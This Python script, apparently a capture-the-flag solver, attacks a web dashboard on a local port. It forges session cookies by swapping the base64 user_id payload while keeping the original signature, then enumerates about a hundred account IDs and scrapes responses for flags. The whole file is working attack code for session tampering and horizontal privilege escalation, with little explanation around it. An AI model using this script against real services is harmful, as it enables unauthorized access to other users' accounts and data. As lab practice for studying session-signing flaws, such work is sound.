import requests
import base64
import json
import re
import time

# Disable SSL warnings for cleaner output
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Session components
payload_part = "eyJ1c2VyX2lkIjoiMTAwMzIifQ"  # Original base64 encoded payload
timestamp_signature = ".aVd0oA.VqPUgS4MLdLZbrF9JRNetU8FfwI"

# Target
url = "http://127.0.0.1:33187/dashboard"

successful_ids = []
flags_found = []

print("[*] Testing session cookie manipulation (10000-10100)")
print("[*] Keeping timestamp and signature, modifying payload only\n")

try:
    # First get baseline response with original cookie
    original_cookie = payload_part + timestamp_signature
    print(f"[*] Baseline test (user_id=10032)...")
    baseline_resp = requests.get(url, cookies={'session': original_cookie}, timeout=5, verify=False)
    baseline_size = len(baseline_resp.content)
    baseline_preview = baseline_resp.text[:150]
    print(f"    Size: {baseline_size}B | Status: {baseline_resp.status_code}")
    print(f"    Preview: {baseline_preview}...\n")
except Exception as e:
    print(f"[!] Baseline error: {e}")
    baseline_size = 0
    baseline_preview = ""

# Test user IDs
for uid in range(10000, 10101):
    try:
        # Create modified payload: {"user_id":"XXXX"}
        payload = json.dumps({"user_id": str(uid)}, separators=(',', ':'))
        encoded = base64.b64encode(payload.encode()).decode().rstrip('=')
        cookie = encoded + timestamp_signature
        
        # Test cookie
        resp = requests.get(url, cookies={'session': cookie}, timeout=5, verify=False)
        size = len(resp.content)
        status = resp.status_code
        
        # Check for flags
        flags = re.findall(r'FLAG\{[^}]+\}', resp.text)
        
        # Store if different from baseline or has flag
        if flags or size != baseline_size or status == 200:
            successful_ids.append({
                'uid': uid,
                'status': status,
                'size': size,
                'flags': flags,
                'preview': resp.text[:200]
            })
            
            if flags:
                flags_found.extend(flags)
                print(f"[!] FLAG at user_id={uid}: {flags}")
            else:
                print(f"[+] Interesting response for user_id={uid}")
                print(f"    Status: {status} | Size: {size}B")
                print(f"    Preview: {resp.text[:100]}...")
        
        # Progress
        if uid % 25 == 0:
            print(f"[*] Progress: {uid - 10000}/101")
            time.sleep(0.2)
            
    except Exception as e:
        if uid % 50 == 0:  # Only show occasional errors to avoid spam
            print(f"[!] Error at uid {uid}: {str(e)[:50]}")

# Results
print("\n" + "="*60)
print("SUMMARY")
print("="*60)
print(f"Accounts with different responses: {len(successful_ids)}")

if successful_ids:
    print("\nValid user IDs found:")
    for item in successful_ids[:10]:  # Show first 10 to avoid spam
        print(f"  {item['uid']} (Status: {item['status']}, Size: {item['size']}B)")
        if len(successful_ids) > 10:
            print(f"  ... and {len(successful_ids) - 10} more")

if flags_found:
    print(f"\n[!] FLAGS FOUND: {len(flags_found)}")
    for flag in flags_found:
        print(f"  {flag}")
else:
    print("\n[*] No flags found in test range")

# Show if many accounts found
if len(successful_ids) > 1:
    print(f"\n[!] VULNERABILITY CONFIRMED: Can access multiple accounts")
    print(f"    Session manipulation allows horizontal privilege escalation")
    print(f"    Original account: 10032")
    print(f"    Additional accounts: {len(successful_ids)}")
